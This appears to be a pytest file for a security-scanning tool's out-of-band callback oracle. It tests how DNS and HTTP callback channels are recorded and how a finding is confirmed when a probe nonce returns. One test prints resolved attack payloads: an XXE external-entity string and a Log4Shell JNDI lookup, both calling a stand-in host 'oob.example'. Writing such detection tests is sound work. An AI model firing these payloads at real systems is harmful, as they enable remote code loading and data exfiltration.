"""Multi-channel OOB callback evidence (D1) — additive enrichment, observed_nonces unchanged."""

from __future__ import annotations

from reachagent.graph.nodes import FindingStatus
from reachagent.oob.collaborator import InteractshCollaborator, OOBCollaborator
from reachagent.oracles import OracleMechanism
from reachagent.oracles.oob_callback import OOBCallbackEvidence, OOBCallbackOracle


def _oracle() -> OOBCallbackOracle:
    return OOBCallbackOracle()


# -- D1 parsing-only: the collaborator tags each interaction with its channel ---


def test_collaborator_records_channel_with_interaction() -> None:
    c = InteractshCollaborator(base_domain="oob.test.internal")
    c.record_interaction("n1", "http")
    c.record_interaction("n2", "dns")
    # Nonces unchanged (blast-radius guard).
    assert c.observed_nonces() == frozenset({"n1", "n2"})
    # Channel enrichment is additive alongside.
    assert c.observed_channels() == frozenset({("n1", "http"), ("n2", "dns")})
    # Default channel keeps existing record_interaction(nonce) callers working.
    c.record_interaction("n3")
    assert c.observed_channels() == frozenset({("n1", "http"), ("n2", "dns"), ("n3", "dns")})


def test_collaborator_still_satisfies_protocol() -> None:
    c = InteractshCollaborator(base_domain="oob.test.internal")
    assert isinstance(c, OOBCollaborator)


# -- D2 evidence carries channels; confirmation logic unchanged ------------------


def test_single_channel_dns_hit_confirms_with_channel_recorded() -> None:
    ev = OOBCallbackEvidence(
        probe_nonce="n1",
        observed_nonces=frozenset({"n1"}),
        observed_channels=frozenset({("n1", "dns")}),
    )
    assert _oracle().run(ev).status is FindingStatus.CONFIRMED_VIOLATION
    assert ("n1", "dns") in ev.observed_channels


def test_http_only_hit_confirms_with_channel_recorded() -> None:
    ev = OOBCallbackEvidence(
        probe_nonce="n1",
        observed_nonces=frozenset({"n1"}),
        observed_channels=frozenset({("n1", "http")}),
    )
    assert _oracle().run(ev).status is FindingStatus.CONFIRMED_VIOLATION
    assert ("n1", "http") in ev.observed_channels


def test_no_hit_any_channel_is_inconclusive() -> None:
    ev = OOBCallbackEvidence(
        probe_nonce="n1",
        observed_nonces=frozenset({"other"}),
        observed_channels=frozenset({("other", "http")}),
    )
    assert _oracle().run(ev).status is FindingStatus.INCONCLUSIVE


def test_observed_nonces_flat_set_type_unchanged() -> None:
    # The blind_detector / portswigger path constructs evidence with a flat
    # frozenset[str] — the new field defaults empty, so those constructions are
    # byte-compatible and behave identically.
    ev = OOBCallbackEvidence(probe_nonce="n1", observed_nonces=frozenset({"n1"}))
    assert isinstance(ev.observed_nonces, frozenset)
    assert _oracle().run(ev).status is FindingStatus.CONFIRMED_VIOLATION
    assert ev.observed_channels == frozenset()


def test_decide_does_not_read_observed_channels() -> None:
    # Enrichment is INERT to logic: channels present but nonce absent from
    # observed_nonces → inconclusive, proving decide() still reads nonces only.
    ev = OOBCallbackEvidence(
        probe_nonce="n1",
        observed_nonces=frozenset(),
        observed_channels=frozenset({("n1", "http"), ("n1", "ldap")}),
    )
    assert _oracle().run(ev).status is FindingStatus.INCONCLUSIVE


def test_empty_probe_nonce_still_refused() -> None:
    ev = OOBCallbackEvidence(
        probe_nonce="",
        observed_nonces=frozenset({""}),
        observed_channels=frozenset({("", "dns")}),
    )
    assert _oracle().run(ev).status is FindingStatus.INCONCLUSIVE


# -- Phase 2a OOB templates unchanged, richer evidence when channel fires --------


def test_phase2a_oob_templates_resolve_identically() -> None:
    from reachagent.payloads.payload_resolver import resolve

    assert resolve("sqli_blind/oob-xxe-exfil", nonce="ra-x", collab="oob.example") == (
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ra-x.oob.example/xxe">]>'
    )
    assert resolve("command_injection/log4shell-oob", nonce="ra-l", collab="oob.example") == (
        "${jndi:ldap://ra-l.oob.example/a}"
    )


# -- D4: exactly six OracleMechanism members -------------------------------------


def test_six_oracle_families_unchanged() -> None:
    assert set(OracleMechanism) == {
        OracleMechanism.DIFFERENTIAL,
        OracleMechanism.STRUCTURAL,
        OracleMechanism.TIMING_STATISTICAL,
        OracleMechanism.OOB_CALLBACK,
        OracleMechanism.EXECUTION_CONFIRMATION,
        OracleMechanism.BUSINESS_RULE_INVARIANT,
    }
